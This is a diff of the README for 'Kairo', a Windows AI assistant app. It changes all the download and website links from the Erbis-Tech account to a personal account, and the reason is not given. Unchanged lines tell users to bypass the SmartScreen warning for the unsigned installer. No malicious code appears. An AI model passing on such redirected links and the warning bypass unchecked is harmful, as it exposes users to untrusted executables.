@@ -8,7 +8,7 @@
 Hands-free voice, a cinematic 3D Earth, Jarvis mode, games, school help, a desktop pet and a lot more.
 Works with Gemini (free), Claude, GPT or a local model.
 
-[**⬇ Download for Windows**](https://github.com/Erbis-Tech/kairo/releases/latest/download/Kairo-Setup.exe) · [Website](https://erbis-tech.github.io/kairo/)
+[**⬇ Download for Windows**](https://github.com/eronrexhepi1234-tech/kairo/releases/latest/download/Kairo-Setup.exe) · [Website](https://eronrexhepi1234-tech.github.io/kairo/)
 
 ![Today](docs/screenshots/today.png)
 
@@ -27,9 +27,9 @@ Works with Gemini (free), Claude, GPT or a local model.
 
 ## Install
 
-**Easy way:** [**Download Kairo-Setup.exe**](https://github.com/Erbis-Tech/kairo/releases/latest/download/Kairo-Setup.exe) and run it – a welcome setup guides you through the rest. Kairo updates itself when a new version is out.
+**Easy way:** [**Download Kairo-Setup.exe**](https://github.com/eronrexhepi1234-tech/kairo/releases/latest/download/Kairo-Setup.exe) and run it – a welcome setup guides you through the rest. Kairo updates itself when a new version is out.
 
-Or visit the download page: **https://erbis-tech.github.io/kairo/**
+Or visit the download page: **https://eronrexhepi1234-tech.github.io/kairo/**
 
 > Windows may say *"Windows protected your PC"* because Kairo is new and not code-signed. Click **More info → Run anyway**.
 
